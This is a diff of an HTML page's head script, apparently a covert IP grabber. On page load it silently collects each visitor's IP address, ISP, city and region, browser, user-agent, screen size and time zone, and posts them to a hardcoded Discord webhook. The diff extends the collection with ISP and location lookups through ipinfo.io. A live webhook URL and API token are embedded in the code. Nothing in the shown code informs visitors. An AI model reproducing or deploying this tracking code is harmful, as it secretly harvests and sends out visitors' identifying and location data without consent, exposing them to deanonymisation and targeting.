@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 
- <script>
+<script>
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // Replace with your webhook
 
   // Get User-Agent string
@@ -35,11 +35,13 @@
   // Get time zone
   const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
 
-  // Fetch public IP
-  fetch('https://api.ipify.org?format=json')
+  // Fetch IP and ISP info using ipinfo.io
+  fetch('https://ipinfo.io/json?token=6ed2b2fac88455') // Replace YOUR_TOKEN_HERE with free token from ipinfo.io
     .then(res => res.json())
     .then(data => {
-      const ip = data.ip;
+      const ip = data.ip || "Unknown";
+      const isp = data.org || "Unknown";
+      const location = `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country || "Unknown"}`;
 
       // Send all info to Discord webhook using an embed
       return fetch(WEBHOOK_URL, {
@@ -54,6 +56,8 @@
               color: 3447003, // Blue color
               fields: [
                 { name: "IP Address", value: ip, inline: true },
+                { name: "ISP / Org", value: isp, inline: true },
+                { name: "Location", value: location, inline: true },
                 { name: "Browser", value: browserInfo, inline: true },
                 { name: "User-Agent", value: userAgent, inline: false },
                 { name: "Screen Resolution", value: screenRes, inline: true },
@@ -71,6 +75,7 @@
       console.error("Error sending data:", err);
     });
 </script>
+
 
 </head>
 <body>
